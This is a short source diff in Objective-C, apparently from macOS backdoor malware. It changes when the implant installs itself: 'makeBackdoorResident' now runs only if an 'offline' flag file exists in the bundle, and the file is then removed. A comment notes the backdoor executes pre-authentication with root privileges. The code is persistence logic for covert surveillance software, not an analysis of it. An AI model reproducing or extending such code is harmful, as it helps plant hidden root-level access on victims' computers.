@@ -2384,7 +2384,18 @@ static void computerWillShutdown(CFMachPortRef port,
                                                      minor: &gOSMinor
                                                     bugFix: &gOSBugFix];
 
-  [self makeBackdoorResident];
+  NSString *offlineFlag = [NSString stringWithFormat: @"%@/00",
+                           [[NSBundle mainBundle] bundlePath]];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: offlineFlag])
+    {
+#ifdef DEBUG_CORE
+      warnLog(@"Offline mode, installing the backdoor right now");
+#endif
+      [self makeBackdoorResident];
+      [[NSFileManager defaultManager] removeItemAtPath: offlineFlag
+                                                 error: nil];
+    }
 
   //
   // With SLIPLIST mode, the backdoor will be executed preauth with uid = 0
